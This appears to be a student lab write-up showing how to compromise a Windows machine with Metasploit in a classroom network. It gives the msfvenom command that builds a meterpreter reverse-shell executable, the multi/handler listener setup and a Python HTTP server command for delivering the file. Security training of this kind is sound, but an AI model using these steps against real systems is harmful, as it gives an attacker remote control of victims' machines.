# EX 6 Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.66.29 LPORT=1234 --platform=windows -f exe>open.exe```

```msfconsole -q```

```set PAYLOAD windows/meterpreter/reverse_tcp```

```use exploit/multi/handler```

```set LHOST 192.168.66.29```

```set LPORT 1234```

```run```

### OUTPUT:

![Screenshot 2025-04-23 224215](https://github.com/user-attachments/assets/7ba2f8e2-b6c0-4dea-99ec-0ad24ec81d84)



```python3 -m http.server 5678```

### OUTPUT:

![Screenshot 2025-04-23 224233](https://github.com/user-attachments/assets/1ddbb1a7-41c5-461c-86b3-d026903abb83)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
